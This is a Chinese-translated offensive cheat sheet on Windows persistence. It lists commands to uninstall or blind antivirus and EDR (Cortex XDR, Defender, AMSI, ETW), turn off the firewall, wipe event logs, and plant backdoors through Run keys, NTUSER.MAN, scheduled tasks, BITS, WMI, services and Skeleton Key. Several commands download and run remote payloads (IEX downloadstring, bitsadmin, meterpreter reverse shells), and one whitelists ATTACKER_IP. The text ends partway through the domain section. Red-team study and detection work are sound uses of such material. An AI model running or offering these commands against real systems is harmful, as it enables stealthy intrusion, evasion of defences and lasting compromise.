# Windows - Persistence (持久化)

## 摘要 (Summary)

* [工具 (Tools)](#tools)
* [隐藏你的二进制文件 (Hide Your Binary)](#hide-your-binary)
* [禁用防病毒软件和安全功能 (Disable Antivirus and Security)](#disable-antivirus-and-security)
    * [防病毒软件卸载 (Antivirus Removal)](#antivirus-removal)
    * [禁用 Windows Defender (Disable Windows Defender)](#disable-windows-defender)
    * [禁用 Windows 防火墙 (Disable Windows Firewall)](#disable-windows-firewall)
    * [清除系统和安全日志 (Clear System and Security Logs)](#clear-system-and-security-logs)
* [普通用户 (Simple User)](#simple-user)
    * [注册表 HKCU (Registry HKCU)](#registry-hkcu)
    * [启动项 (Startup)](#startup)
    * [用户计划任务 (Scheduled Tasks User)](#scheduled-tasks-user)
    * [BITS 作业 (BITS Jobs)](#bits-jobs)
    * [COM TypeLib](#com-typelib)
* [服务相关 (Serviceland)](#serviceland)
    * [IIS](#iis)
    * [Windows 服务 (Windows Service)](#windows-service)
* [提权/高权限 (Elevated)](#elevated)
    * [注册表 HKLM (Registry HKLM)](#registry-hklm)
        * [Winlogon 辅助 DLL (Winlogon Helper DLL)](#winlogon-helper-dll)
        * [GlobalFlag](#globalflag)
    * [提权后的启动项 (Startup Elevated)](#startup-elevated)
    * [提权后的服务 (Services Elevated)](#services-elevated)
    * [服务安全描述符 (Service Security Descriptor)](#servicesecuritydescriptor)
    * [提权后的计划任务 (Scheduled Tasks Elevated)](#scheduled-tasks-elevated)
    * [Windows Management Instrumentation 事件订阅 (Windows Management Instrumentation Event Subscription)](#windows-management-instrumentation-event-subscription)
    * [二进制替换 (Binary Replacement)](#binary-replacement)
        * [Windows XP+ 上的二进制替换](#binary-replacement-on-windows-xp)
        * [Windows 10+ 上的二进制替换](#binary-replacement-on-windows-10)
    * [万能钥匙 (Skeleton Key)](#skeleton-key)
    * [虚拟机 (Virtual Machines)](#virtual-machines)
    * [Windows Subsystem for Linux (WSL)](#windows-subsystem-for-linux)
* [域 (Domain)](#domain)
    * [用户证书 (User Certificate)](#user-certificate)
    * [黄金证书 (Golden Certificate)](#golden-certificate)
    * [黄金票据 (Golden Ticket)](#golden-ticket)
    * [LAPS 持久化 (LAPS Persistence)](#laps-persistence)
* [参考和来源 (References)](#references)

## 工具 (Tools)

* [SharPersist - 用 C# 编写的 Windows 持久化工具包。 - @h4wkst3r](https://github.com/fireeye/SharPersist)

## 隐藏你的二进制文件 (Hide Your Binary)

> 设置 (+) 或清除 (-) 隐藏 (Hidden) 文件属性。如果文件使用了此属性设置，则必须先清除该属性，然后才能更改该文件的任何其他属性。

```ps1
PS> attrib +h mimikatz.exe
```

## 禁用防病毒软件和安全功能 (Disable Antivirus and Security)

### 防病毒软件卸载 (Antivirus Removal)

* [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
* [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
* [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)

    ```ps1
    cd "C:\Program Files\Elastic\Agent\"
    PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
    Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
    Elastic Agent has been uninstalled.
    ```

* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)

    ```ps1
    # 全局卸载密码: Password1
    Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
    Look for PasswordHash, PasswordSalt or password, salt strings.

    # 禁用 Cortex：将 DLL 更改为随机值，然后重新启动 (REBOOT)
    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f

    # 在启动时禁用代理（需要重启才能生效）
    cytool.exe startup disable

    # 禁用对 Cortex XDR 文件、进程、注册表和服务的保护
    cytool.exe protect disable

    # 禁用 Cortex XDR (即使启用了防篡改保护)
    cytool.exe runtime disable

    # 禁用事件收集
    cytool.exe event_collection disable
    ```

### 禁用 Windows Defender (Disable Windows Defender)

```powershell
# 禁用 Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## 排除进程/位置 (Exclude a process / location)
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# 禁用扫描所有下载的文件和附件，禁用 AMSI (反应式)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# 禁用 AMSI (设置为 0 以启用)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# 致盲 ETW Windows Defender：将其 ETW 会话对应的注册表值清零
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# 擦除当前存储的定义 (Wipe currently stored definitions)
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# 删除签名 (如果存在 Internet 连接，它们将被再次下载):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# 禁用 Windows Defender 安全中心
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# 禁用实时保护
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

### 禁用 Windows 防火墙 (Disable Windows Firewall)

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip 白名单 (ip whitelisting)
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

### 清除系统和安全日志 (Clear System and Security Logs)

```powershell
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security
```

## 普通用户 (Simple User)

将文件设置为隐藏

```powershell
attrib +h c:\autoexec.bat
```

### 注册表 HKCU (Registry HKCU)

在 `HKCU\Software\Microsoft\Windows` 内的 `Run` 键中创建一个 `REG_SZ` 值。

```powershell
Value name:  Backdoor
Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

* 使用命令行 (Using the command line)

    ```powershell
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
    ```

* 使用 [mandiant/SharPersist](https://github.com/mandiant/SharPersist)

    ```powershell
    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
    ```

#### 通过 NTUSER.MAN 进行持久化 (Persistence via NTUSER.MAN)

直接修改 `HKCU` 进行持久化（例如，`Run` 键）非常显眼，且通常会被现代 EDR 解决方案检测到。一个鲜为人知的替代方案是通过滥用被 Windows 视为强制配置文件的 `NTUSER.MAN` 来离线预先播种目标用户的注册表配置单元。

当用户登录时，Windows 从磁盘加载其注册表配置单元。如果存在 `NTUSER.MAN` 文件（代替或与 `NTUSER.DAT` 并且存在），Windows 将以只读模式加载此配置单元，并逐字应用其内容——不会产生通常的注册表修改遥测数据。

不需要编辑实时注册表，而是：

1. 导出目标用户的 `HKCU` 注册表配置单元
   * 通过 `reg export HKCU exported.reg`
   * 使用基于 BOF 的方法以避免产生 `reg.exe` 进程。
2. 离线修改导出的注册表数据
   * 添加或更改持久化机制（例如 `Run` 键）。
3. 将修改后的 `.reg` 文件转换为二进制配置单元
   * 使用 [praetorian-inc/swarmer](https://github.com/praetorian-inc/swarmer) 生成一个有效的 `NTUSER.MAN`。
4. 将生成的 `NTUSER.MAN` 拖放到用户的配置文件目录中
   * `%USERPROFILE%\NTUSER.MAN`

示例:

```powershell
swarmer.exe --startup-key "Updater" --startup-value "C:\Path\To\payload.exe" exported.reg NTUSER.MAN
```

在下一次登录时，Windows 会自动加载此配置单元，从而在不触及实时注册表的情况下建立持久性。

**强制配置文件的副作用**
创建 `NTUSER.MAN` 会将用户配置文件转换为强制配置文件。在会话期间所做的任何注册表或配置文件更改都会在注销时被丢弃，并且不会在登录之间保留。

**无提权的不可变性**
一旦部署，该配置单元实际上是不可变的 (immutable)。修改或删除持久化后门需要删除 `NTUSER.MAN`，这通常需要管理员权限。

**仅限登录时加载**
该配置单元仅在用户登录期间加载。在用户完全注销并重新登录之前，对 `NTUSER.MAN` 的更改不会产生影响。

**范围有限**
此技术仅适用于用户注册表配置单元 (`HKCU`)。它不影响计算机范围内的设置 (`HKLM`) 并且仅提供每用户级别的持久化。

### 启动项 (Startup)

在用户启动文件夹（user startup folder）创建一个批处理脚本：`%AppData%`

```powershell
PS C:\> gc C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Username\AppData\Local\Temp\backdoor.exe
```

使用 SharPersist

```powershell
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

### 用户计划任务 (Scheduled Tasks User)

* 使用原生的 **schtask** - 创建一个新任务

    ```powershell
    # 创建定时任务在 00:00 运行一次
    schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
    # 强制立刻运行 !
    schtasks /run /tn "Device-Synchronize"
    ```

* 使用原生的 **schtask** - 利用 `schtasks /change` 命令来修改现有的计划任务

    ```powershell
    # 通过调用 ShellExec_RunDLL 函数来启动可执行文件
    SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
    ```

* 使用 Powershell

    ```powershell
    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
    PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
    PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
    PS C:\> $S = New-ScheduledTaskSettingsSet
    PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
    PS C:\> Register-ScheduledTask Backdoor -InputObject $D
    ```

* 使用 SharPersist

    ```powershell
    # 添加到当前的计划任务
    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

    # 添加新任务
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
    ```

### BITS 作业 (BITS Jobs)

```powershell
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"

# v1
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

# v2 - exploit/multi/script/web_delivery
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
```

### COM TypeLib

* [CICADA8-Research/TypeLibWalker](https://github.com/CICADA8-Research/TypeLibWalker) - TypeLib 持久化技术

使用 [sysinternals/procmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procmon) 查找状态为 `NAME NOT FOUND` 的 `RegOpenKey`。`explorer.exe` 进程是一个很好的目标，因为它每次运行时都会生成你的 payload。

```ps1
Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win32
Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win64
Name: anything
Type: REG_SZ
Value: script:C:\1.sct
```

`1.sct` 内容的示例：

```xml
<?xml version="1.0"?>
<scriptlet>
    <registration
        description="explorer"
        progid="explorer"
        version="1.0"
        classid="{66666666-6666-6666-6666-666666666666}"
        remotable="true">
    </registration>
    <script language="JScript">
        <![CDATA[
            var WShell = new ActiveXObject("WScript.Shell");
            WShell.Run("calc.exe");
        ]]>
    </script>
</scriptlet>
```

## 服务相关 (Serviceland)

### IIS

IIS Raid – 使用本机模块向 IIS 植入后门 (Backdooring IIS Using Native Modules)

```powershell
$ git clone https://github.com/0x09AL/IIS-Raid
$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

### Windows 服务 (Windows Service)

使用 SharPersist

```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```
## 提权/高权限 (Elevated)

### 注册表 HKLM (Registry HKLM)

类似于 HKCU。在 `HKLM\Software\Microsoft\Windows` 内的 `Run` 键中创建一个 `REG_SZ` 值。

```powershell
Value name:  Backdoor
Value data:  C:\Windows\Temp\backdoor.exe
```

使用命令行

```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```

#### Winlogon 辅助 DLL (Winlogon Helper DLL)

> 在 Windows 登录期间运行可执行文件

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```

#### GlobalFlag

> 在记事本 (notepad) 被杀死后运行可执行文件

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```

### 提权后的启动项 (Startup Elevated)

在 `ProgramData` 启动文件夹中创建一个批处理脚本。

```powershell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
```

### 提权后的服务 (Services Elevated)

创建一个将自动或按需启动的服务。

```powershell
# Powershell
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
sc start Backdoor

# SharPersist
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add

# sc
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
sc start Backdoor
```

### 服务安全描述符 (Service Security Descriptor)

通过使用 sdset 选项，向服务控制管理器提供过度宽松的应用侧控制列表 (ACL)，以持久地允许任意非管理用户在计算机上获得完整的 SYSTEM 权限。

**漏洞利用 (Exploit)**:

```ps1
sc.exe sdset <ServiceName> <ServiceSecurityDescriptor>
```

以下命令向所有用户（由代表 "World" 的 `WD` 表示）授予对服务控制管理器的完全控制权 (`Key Access`)。换句话说，它允许任何用户通过服务控制管理器启动、停止、修改或控制服务，这可能是一个安全风险，因为它向系统上的所有人开放了服务管理的权限。

```ps1
sc.exe sdset scmanager D:(A;;KA;;;WD)
```

* `sc.exe`: Service Control (sc) 命令是一个用于管理服务的 Windows 实用程序。
* `sdset`: 此选项为服务或服务控制管理器本身设置安全描述符 (SD)。安全描述符定义了对系统资源的权限和访问权限。
* `scmanager`: 这是目标，指服务控制管理器，它管理着系统中的服务。

`ServiceSecurityDescriptor` 是使用服务描述符定义语言 (SDDL) 定义的。

列出 `scmanager` 的权限

```ps1
sc.exe sdshow scmanager
```

或者，可以使用 [zacateras/sddl-parser](https://github.com/zacateras/sddl-parser) 来了解安全描述符定义语言 (SDDL)，例如：`./Sddl.Parser.Console.exe "O:BAG:BAD:(A;CI;CCDCRP;;;NS)"`。

滥用该弱配置来创建一个服务，此服务向自定义用户 `user_basic` 授予管理员权限。

```ps1
sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators user_basic /add" start= auto
```

然后，你需要等待系统重新启动以自动启动服务，并赋予用户提升的权限或你在 `binPath` 指定的中任何持久化机制。

### 提权后的计划任务 (Scheduled Tasks Elevated)

以 SYSTEM 身份运行的计划任务，在每天早上 9 点或特定日期执行。

> 作为计划任务衍生的进程具有 taskeng.exe 进程作为其父进程

```powershell
# Powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -Daily -At 9am
# OR
$T = New-ScheduledTaskTrigger -Daily -At "9/30/2020 11:05:00 AM"
$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
Register-ScheduledTask "Backdoor" -InputObject $D

# Native schtasks
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
schtasks /Create /RU "NT AUTHORITY\SYSTEM" /tn [TaskName] /tr "regsvr32.exe -s \"C:\Users\*\AppData\Local\Temp\[payload].dll\"" /SC ONCE /Z /ST [Time] /ET [Time]

##(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 
##(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 
##(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 
##(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 
##(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 
##(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

### Windows Management Instrumentation 事件订阅 (Windows Management Instrumentation Event Subscription)

> 攻击者可以使用 Windows Management Instrumentation (WMI) 来安装事件过滤器 (event filters)、提供程序 (providers)、使用者 (consumers) 和绑定 (bindings)，以便在发生定义事件时执行代码。攻击者可以利用 WMI 的功能订阅事件，并在该事件发生时执行任意代码，从而在系统上提供持久化功能。

* **__EventFilter**: 触发器 (Trigger) (新进程、登录失败等)
* **EventConsumer**: 执行操作 (Perform Action) (执行有效载荷 payload 等)
* **__FilterToConsumerBinding**: 绑定过滤器和消费类 (Binds Filter and Consumer Classes)

```ps1
# 使用 CMD : Windows 启动 60 秒后执行二进制文件
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WMIPersist", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WMIPersist", ExecutablePath="C:\Windows\System32\binary.exe",CommandLineTemplate="C:\Windows\System32\binary.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WMIPersist\"", Consumer="CommandLineEventConsumer.Name=\"WMIPersist\""
# 移除它
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WMIPersist'" | Remove-WmiObject -Verbose

# 使用 Powershell (部署)
$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\binary.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
# 使用 Powershell (移除)
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'WMIPersist'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'WMIPersist'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```

### 二进制替换 (Binary Replacement)

#### Windows XP+ 上的二进制替换

| 功能 (Feature)             | 可执行文件 (Executable)                            |
|---------------------|---------------------------------------|
| 粘滞键 (Sticky Keys)         | C:\Windows\System32\sethc.exe         |
| 轻松访问菜单 (Accessibility Menu)  | C:\Windows\System32\utilman.exe       |
| 屏幕键盘 (On-Screen Keyboard)  | C:\Windows\System32\osk.exe           |
| 放大镜 (Magnifier)           | C:\Windows\System32\Magnify.exe       |
| 讲述人 (Narrator)            | C:\Windows\System32\Narrator.exe      |
| 显示切换器 (Display Switcher)    | C:\Windows\System32\DisplaySwitch.exe |
| 应用程序切换器 (App Switcher)        | C:\Windows\System32\AtBroker.exe      |

在 Metasploit 内 : `use post/windows/manage/sticky_keys`

#### Windows 10+ 上的二进制替换

利用在屏幕键盘 (On-Screen Keyboard) **osk.exe** 可执行文件中的一个 DLL 劫持漏洞。

在路径 `C:\Program Files\Common Files\microsoft shared\ink\HID.dll` 创建一个恶意的 **HID.dll**。

### 万能钥匙 (Skeleton Key)

> 将主密码 (master password) 注入到域控制器 (Domain Controller) 的 LSASS 进程中。

**要求 (Requirements)**:

* Domain Administrator (需要 SeDebugPrivilege) 或 `NTAUTHORITY\SYSTEM`

**漏洞利用 (Exploitation)**:

```powershell
# 执行 skeleton key 攻击
mimikatz "privilege::debug" "misc::skeleton"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# 使用任意用户名配合固定密码 "mimikatz" 登录
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### 虚拟机 (Virtual Machines)

> 基于 Shadow Bunny 技术。

```ps1
# 下载 virtualbox
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

# 执行静默安装，并避免创建桌面图标和快速启动图标
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
# 禁用通知
.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

# 下载虚拟机磁盘
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

# 创建新的虚拟机
$vmname = "IT Recovery"
.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

# 以 NAT 模式添加一张网卡
.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
.\VBoxManage.exe modifyvm $vmname --nic1 nat
.\VBoxManage.exe modifyvm $vmname --audio none
.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

# 挂载 VHD 文件
.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

# 启动虚拟机
.\VBoxManage.exe startvm $vmname –type headless 


# 可选 - 添加共享文件夹
# 要求：带有 VirtualBox Guest Additions 工具
.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
# 然后在虚拟机内挂载文件夹
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

### Windows Subsystem for Linux (WSL)

```ps1
# 列出并安装在线分发包
wsl --list --online
wsl --install -d kali-linux

# 使用本地离线扩展包
wsl --set-default-version 2
curl.exe --insecure -L -o debian.appx https://aka.ms/wsl-debian-gnulinux
Add-AppxPackage .\debian.appx

# 以 root 用户身份运行机器
wsl kali-linux --user root
```

## 域 (Domain)

### 用户证书 (User Certificate)

```ps1
# 为 User 模板申请证书
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User

# 为 Rubeus 转化该证书
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 拿这个证书申请 TGT
.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
```

### 黄金证书 (Golden Certificate)

> 需要在 Active Directory 或者 ADCS 机器上拥有特权

* 等出 CA 作为 p12 证书: `certsrv.msc` > `Right Click` -> `Back up CA...`
* 替代方案 1: 利用 Mimikatz 将证书提权为 PFX/DER 格式
    
    ```ps1
    privilege::debug
    crypto::capi
    crypto::cng
    crypto::certificates /systemstore:local_machine /store:my /export
    ```

* 替代方案 2: 使用 SharpDPAPI，然后转化证书: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
